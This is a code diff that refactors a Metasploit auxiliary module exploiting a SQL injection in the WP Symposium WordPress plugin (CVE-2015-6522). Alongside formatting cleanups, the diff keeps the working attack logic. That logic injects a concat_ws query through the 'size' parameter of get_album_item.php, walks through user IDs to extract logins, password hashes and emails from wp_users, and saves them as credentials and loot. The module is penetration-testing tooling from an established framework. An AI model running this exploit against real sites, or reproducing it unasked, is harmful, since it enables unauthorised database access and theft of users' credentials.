@@ -7,32 +7,33 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HTTP::Wordpress
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'            => 'WordPress Symposium Plugin SQL Injection',
-      'Description'     => %q{
-        This module exploits a SQL injection vulnerability in the WP Symposium plugin
-        before 15.8 for WordPress, which allows remote attackers to extract credentials
-        via the size parameter to get_album_item.php.
-      },
-      'Author'          =>
-        [
-          'PizzaHatHacker',                       # Vulnerability discovery
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress Symposium Plugin SQL Injection',
+        'Description' => %q{
+          This module exploits a SQL injection vulnerability in the WP Symposium plugin
+          before 15.8 for WordPress, which allows remote attackers to extract credentials
+          via the size parameter to get_album_item.php.
+        },
+        'Author' => [
+          'PizzaHatHacker', # Vulnerability discovery
           'Matteo Cantoni <goony[at]nothink.org>' # Metasploit module
         ],
-      'License'         => MSF_LICENSE,
-      'References'      =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2015-6522'],
           ['EDB', '37824']
         ],
-      'DisclosureDate'  => 'Aug 18 2015'
-      ))
+        'DisclosureDate' => '2015-08-18'
+      )
+    )
 
     register_options(
       [
         OptString.new('URI_PLUGIN', [true, 'The WordPress Symposium Plugin URI', 'wp-symposium'])
-      ])
+      ]
+    )
   end
 
   def check
@@ -48,45 +49,18 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_cgi(
-        'method'   => 'GET',
-        'uri'      => uri_complete,
+        'method' => 'GET',
+        'uri' => uri_complete,
         'vars_get' => { 'size' => sql_query }
       )
 
       return nil if res.nil? || res.code != 200 || res.body.nil?
 
       res.body
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE => e
       vprint_error("#{peer} - The host was unreachable!")
       return nil
     end
-  end
-
-  def report_cred(opts)
-    service_data = {
-      address: opts[:ip],
-      port: opts[:port],
-      service_name: opts[:service_name],
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
-
-    credential_data = {
-      origin_type: :service,
-      module_fullname: fullname,
-      username: opts[:user],
-      private_data: opts[:password],
-      private_type: :nonreplayable_hash,
-    }.merge(service_data)
-
-    login_data = {
-      core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
-      proof: opts[:proof]
-    }.merge(service_data)
-
-    create_credential_login(login_data)
   end
 
   def run
@@ -109,39 +83,40 @@ class MetasploitModule < Msf::Auxiliary
       vprint_status("#{peer} - Last user-id is '#{last_id}'")
     end
 
-    credentials = ""
+    credentials = ''
 
-    vprint_status("#{peer} - Trying to retrieve the users informations...")
+    vprint_status("#{peer} - Trying to retrieve the users information...")
     for user_id in first_id..last_id
-      separator = Rex::Text.rand_text_numeric(7,bad='0')
+      separator = Rex::Text.rand_text_numeric(7, bad = '0')
       user_info = send_sql_request("concat_ws(#{separator},user_login,user_pass,user_email) from wp_users where id = #{user_id} ; --")
 
       if user_info.nil?
         vprint_error("#{peer} - Failed to retrieve the users info")
         return
       else
-        values = user_info.split("#{separator}")
+        values = user_info.split(separator.to_s)
 
         user_login = values[0]
-        user_pass  = values[1]
+        user_pass = values[1]
         user_email = values[2]
 
-        print_good("#{peer} - #{sprintf("%-15s %-34s %s", user_login, user_pass, user_email)}")
-        report_cred(
-          ip: rhost,
-          port: datastore['RPORT'],
-          service_name: datastore['SSL'] ? 'https' : 'http',
-          user: user_login,
-          password: user_pass,
+        print_good("#{peer} - #{sprintf('%-15s %-34s %s', user_login, user_pass, user_email)}")
+        connection_details = {
+          module_fullname: fullname,
+          username: user_login,
+          private_data: user_pass,
+          private_type: :nonreplayable_hash,
+          status: Metasploit::Model::Login::Status::UNTRIED,
           proof: user_email
-        )
+        }.merge(service_details)
+        create_credential(connection_details)
 
         credentials << "#{user_login},#{user_pass},#{user_email}\n"
       end
     end
 
     unless credentials.empty?
-      loot = store_loot("wp_symposium.http","text/plain", rhost, credentials)
+      loot = store_loot('wp_symposium.http', 'text/plain', rhost, credentials)
       vprint_good("Credentials saved in: #{loot}")
     end
   end
